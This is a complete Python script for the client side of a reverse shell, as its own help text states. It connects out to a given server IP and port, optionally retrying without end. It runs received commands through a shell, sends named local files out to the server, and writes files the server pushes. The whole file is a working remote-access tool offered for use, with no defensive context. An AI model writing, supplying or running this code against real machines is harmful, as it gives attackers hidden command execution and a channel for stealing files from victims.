import socket
import os
import subprocess
import sys, argparse
import shlex


class Client:
    def __init__(self, ip, port, verbose=True, loop=False):
        self.ip = ip
        self.port = port
        self.sock = socket.socket()
        self.loop = loop
        self.verbose = verbose

    def run(self):
        if self.loop:
            while True:
                if self.__connect():
                    self.__shell()
                    self.sock = socket.socket()
        else:
            self.__connect()
            self.__shell()

    def __connect(self):
        try:
            if self.verbose:
                print("Attempting to connect ", (self.ip + ':' + str(self.port)))
            self.sock.connect((self.ip, self.port))
        except ConnectionRefusedError:
            if self.verbose:
                print("Couldn't connect to server")
            return False
        except Exception as e:
            if self.verbose:
                print(e)
            return False
        else:
            if self.verbose:
                print("Connection succesfull!")
                print("->", end='')
            return True

    def save_files(self, files):
        files = files.split(b"FILE_END")[:-1]
        for file in files:
            try:
                file = file.split(b"NAME")
                with open(file[0].decode("utf-8"), "wb") as f:
                    f.write(file[1])
            except Exception as e:
                if self.verbose:
                    print(e)
                else:
                    continue

    def parse_files(self, file_names):
        files = b''
        for file in file_names:
            try:
                with open(file, "rb") as read_object:
                    files += file.encode() + b'NAME' + read_object.read() + b'FILE_END'
            except Exception as e:
                if self.verbose:
                    print(e)
                    print("Error uploading", file)
        return b"FILES" + files + b"->"

    def change_dir(self, path):
        return_string = b''
        try:
            path = path.replace("~", os.path.expanduser("~"))
            os.chdir(path)
        except Exception as e:
            err = str(e) + '\n'
            return_string += str(err).encode()
        return_string += (str(os.getcwd()) + "->").encode()
        return return_string

    def console(self, command):
        cmd = subprocess.Popen(
            shlex.split(command),
            shell=True,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        cmd.wait()
        stdout, stderr = cmd.communicate()
        output = b''
        if stdout:
            output += stdout
        if stderr:
            output += stderr
        output += (str(os.getcwd()) + "->").encode()
        return output

    def __shell(self):
        while True:
            try:
                received = self.sock.recv(1024)
                if received[:len(b"FILES")] == b"FILES":
                    while received[-1*len(b"CONN_END"):] != b"CONN_END":
                        received += self.sock.recv(1024)
                    self.save_files(received[len(b"FILES"):-1*len(b"CONN_END")])
                    self.sock.send((str(os.getcwd()) + "->").encode())
                    continue
                else:
                    command = received.decode("utf-8")
                if self.verbose:
                    print(command)
                response = ''.encode()
                if len(command) == 0:
                    continue
                elif command == "exit":
                    if self.verbose:
                        print("\nConnection closed by server.")
                    self.sock.close()
                    return
                elif command.strip()[:7].lower() == "receive":
                    file_names = shlex.split(command)[1:]
                    response += self.parse_files(file_names)
                elif command.strip()[:2] == "cd":
                    response += self.change_dir(shlex.split(command)[1])
                else:
                    response += self.console(command)
                if len(response) > 0:
                    self.sock.send(response)
                if self.verbose:
                    try:
                        print(response.decode("utf-8"))
                    except UnicodeDecodeError:
                        lines = response.split(b'\n')
                        for line in lines:
                            if line == lines[-1]:
                                print(line, end='')
                            else:
                                print(line)
            except ConnectionResetError:
                if self.verbose:
                    print("\nServer shut down.")
                return
            except Exception as e:
                if self.verbose:
                    raise e
                else:
                    return


def return_parser():
    parser = argparse.ArgumentParser(description="Client side of a reverse shell")
    parser.add_argument("ip", type=str, help="IP of the server")
    parser.add_argument("port", type=int, help="Port the client is going to send the values to")
    parser.add_argument("-v", "--verbose", action="store_true", dest="verbose")
    parser.add_argument("-l", "--loop", action="store_true", dest="loop",
                        help="Program will attempt to connect indefinitely unless halted")
    return parser


def main(argv):
    parser = return_parser()
    args = parser.parse_args(argv)
    verbose = False
    loop = False
    if args.verbose:
        verbose = True
    if args.loop:
        loop = True
    Client(args.ip, args.port, verbose, loop).run()


if __name__ == '__main__':
    main(sys.argv[1:])
